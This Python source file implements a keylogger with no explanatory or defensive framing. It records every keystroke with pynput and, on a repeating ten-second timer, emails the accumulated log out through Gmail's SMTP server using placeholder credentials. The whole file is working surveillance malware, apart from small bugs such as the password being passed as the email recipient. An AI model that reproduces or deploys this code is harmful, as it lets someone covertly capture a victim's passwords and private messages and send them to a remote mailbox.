import pynput.keyboard
import threading
import smtplib

key_log = " "


def control_key_function(key):
    global key_log
    try:
        key_log = key_log + str(key.char)
    except AttributeError:
        if key == key.space:
            key_log = key_log + " "
        else:
            key_log = key_log + " " + str(key) + " "
    except():
        pass

    print(key_log)


def send_email(email, passwd, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, passwd)
    server.sendmail(email, passwd, msg)
    server.quit()


def thread_function():
    global key_log
    send_email("email", "passwd", key_log.encode('utf-8'))
    key_log = " "
    timer_object = threading.Timer(10, thread_function)
    timer_object.start()


def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=control_key_function)
    with keyboard_listener:
        thread_function()
        keyboard_listener.join()


def main():
    start()
